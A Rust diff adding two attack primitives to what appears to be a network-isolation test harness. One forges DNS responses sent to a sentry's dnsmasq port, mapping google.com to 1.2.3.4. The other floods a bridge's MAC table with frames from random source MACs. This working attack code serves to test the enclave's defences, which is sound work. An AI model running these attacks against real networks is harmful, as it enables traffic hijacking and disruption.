@@ -2097,3 +2097,130 @@ pub fn sortie_arp_send_gateway_poison(_extra_args: &[&str]) -> rbida_Verdict {
         fail("AF_PACKET open but targeted ARP frame send failed".to_string())
     }
 }
+
+// ── Coordinated integrity primitives ─────────────────────────
+
+/// Send forged DNS UDP responses to sentry's dnsmasq port claiming google.com → 1.2.3.4.
+/// Coordinated primitive: passed=true means "forged responses were sent" (theurge judges DNS state).
+pub fn sortie_dns_forge_response(_extra_args: &[&str]) -> rbida_Verdict {
+    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
+        Ok(v) => v,
+        Err(e) => return fail(format!("ERROR: {}", e)),
+    };
+
+    // Build a DNS response claiming google.com → 1.2.3.4
+    let build_dns_response = |txn_id: u16| -> Vec<u8> {
+        let mut pkt = Vec::with_capacity(64);
+        // Header (12 bytes)
+        pkt.extend_from_slice(&txn_id.to_be_bytes()); // Transaction ID
+        pkt.extend_from_slice(&0x8580u16.to_be_bytes()); // Flags: QR=1 AA=1 RD=1 RA=1
+        pkt.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
+        pkt.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT
+        pkt.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
+        pkt.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT
+        // Question: google.com A IN
+        pkt.extend_from_slice(b"\x06google\x03com\x00");
+        pkt.extend_from_slice(&1u16.to_be_bytes()); // TYPE A
+        pkt.extend_from_slice(&1u16.to_be_bytes()); // CLASS IN
+        // Answer: pointer to name at offset 12, A record 1.2.3.4
+        pkt.extend_from_slice(&0xC00Cu16.to_be_bytes()); // Name pointer
+        pkt.extend_from_slice(&1u16.to_be_bytes()); // TYPE A
+        pkt.extend_from_slice(&1u16.to_be_bytes()); // CLASS IN
+        pkt.extend_from_slice(&3600u32.to_be_bytes()); // TTL
+        pkt.extend_from_slice(&4u16.to_be_bytes()); // RDLENGTH
+        pkt.extend_from_slice(&[1, 2, 3, 4]); // RDATA: 1.2.3.4
+        pkt
+    };
+
+    let target = format!("{}:53", sentry_ip);
+    let sock = match UdpSocket::bind("0.0.0.0:0") {
+        Ok(s) => s,
+        Err(e) => return fail(format!("cannot bind UDP socket: {}", e)),
+    };
+    let _ = sock.set_write_timeout(Some(Duration::from_secs(2)));
+
+    let mut sent = 0u32;
+    // Send multiple forged responses with varying transaction IDs
+    for txn_id in 1000u16..1050 {
+        let pkt = build_dns_response(txn_id);
+        if sock.send_to(&pkt, &target).is_ok() {
+            sent += 1;
+        }
+    }
+
+    if sent > 0 {
+        pass(format!(
+            "SENT {} forged DNS responses to {}:53 claiming google.com→1.2.3.4",
+            sent, sentry_ip
+        ))
+    } else {
+        fail(format!(
+            "failed to send any forged DNS packets to {}",
+            target
+        ))
+    }
+}
+
+/// Flood the bridge's MAC learning table with frames from random source MACs.
+/// Coordinated primitive: passed=true means "flood was executed" (theurge judges connectivity).
+pub fn sortie_mac_flood_bridge(_extra_args: &[&str]) -> rbida_Verdict {
+    let (iface, _our_mac) = match get_interface_info() {
+        Some((i, m)) => (i, m),
+        None => return fail("ERROR: cannot discover enclave interface".to_string()),
+    };
+
+    if arp_test_af_packet(&iface).is_err() {
+        return fail("AF_PACKET unavailable — cannot send L2 frames".to_string());
+    }
+
+    let broadcast = [0xFFu8; 6];
+    let mut sent = 0u32;
+    let mut rng_buf = [0u8; 6];
+
+    for i in 0u32..200 {
+        // Generate a random unicast MAC
+        if let Ok(mut f) = std::fs::File::open("/dev/urandom") {
+            if IoRead::read_exact(&mut f, &mut rng_buf).is_err() {
+                // Fallback: deterministic but varied MACs
+                rng_buf = [
+                    0x02,
+                    ((i >> 24) & 0xFF) as u8,
+                    ((i >> 16) & 0xFF) as u8,
+                    ((i >> 8) & 0xFF) as u8,
+                    (i & 0xFF) as u8,
+                    0x01,
+                ];
+            }
+        } else {
+            rng_buf = [
+                0x02,
+                ((i >> 24) & 0xFF) as u8,
+                ((i >> 16) & 0xFF) as u8,
+                ((i >> 8) & 0xFF) as u8,
+                (i & 0xFF) as u8,
+                0x01,
+            ];
+        }
+        // Set locally-administered + unicast bits
+        rng_buf[0] = (rng_buf[0] & 0xFE) | 0x02;
+
+        let mut frame = Vec::with_capacity(60);
+        frame.extend_from_slice(&broadcast); // dst: broadcast
+        frame.extend_from_slice(&rng_buf); // src: random MAC
+        frame.extend_from_slice(&[0x88, 0xB5]); // ethertype: Local Experimental
+        frame.resize(60, 0); // pad to minimum Ethernet frame size
+
+        if send_raw_frame(&iface, &frame) {
+            sent += 1;
+        }
+    }
+
+    if sent > 0 {
+        pass(format!(
+            "SENT {} frames with random source MACs on {}",
+            sent, iface
+        ))
+    } else {
+        fail("AF_PACKET open but no frames could be sent".to_string())
+    }
+}
